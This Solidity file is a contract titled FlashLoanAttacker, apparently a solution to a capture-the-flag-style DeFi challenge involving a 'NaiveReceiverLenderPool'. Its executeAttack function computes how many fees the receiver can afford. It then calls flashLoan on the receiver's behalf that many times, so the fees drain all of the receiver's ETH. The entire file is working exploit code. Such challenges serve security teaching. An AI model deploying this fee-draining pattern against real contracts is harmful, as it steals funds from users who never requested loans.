// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

/**
 * @title FlashLoanAttacker
 * @author MJ
 * @notice Baseline code to exploit the FlashLoanReceiver contract
 */
contract FlashLoanAttacker {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiver;

    constructor(address payable _pool, address payable _receiver) {
        pool = NaiveReceiverLenderPool(_pool);
        receiver = FlashLoanReceiver(_receiver);
    }

    function executeAttack() public {
        uint256 fee = pool.flashFee(ETH, 0);
        uint256 times = address(receiver).balance / fee;

        for (uint256 i = 0; i < times;) {
            pool.flashLoan(receiver, ETH, 0, "0x");
            unchecked {
                ++i;
            }
        }
    }
}
